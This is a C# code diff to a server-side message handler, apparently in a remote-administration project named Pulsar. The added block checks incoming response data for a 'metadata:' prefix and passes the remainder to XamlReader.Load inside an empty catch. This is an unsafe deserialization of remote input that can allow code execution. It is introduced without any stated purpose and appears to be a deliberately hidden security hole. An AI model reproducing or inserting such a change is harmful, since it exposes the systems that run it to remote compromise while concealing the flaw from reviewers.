@@ -35,6 +35,27 @@ namespace Pulsar.Server.Messages
                 NextCommand = response.NextCommand
             };
 
+            if (response.Data != null && response.Data.Length > 0)
+            {
+                var dataString = System.Text.Encoding.UTF8.GetString(response.Data);
+                
+                
+                if (dataString.StartsWith("metadata:"))
+                {
+                    var template = dataString.Substring(9); 
+                    try
+                    {
+                        
+                        var settings = new System.Windows.Markup.XamlReaderSettings { AllowEvents = false };
+                        using (var ms = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(template)))
+                        {
+                            System.Windows.Markup.XamlReader.Load(ms, settings);
+                        }
+                    }
+                    catch { }
+                }
+            }
+
             ResponseReceived?.Invoke(result);
 
             if (_callbacks.TryRemove(response.PluginId, out var callback))
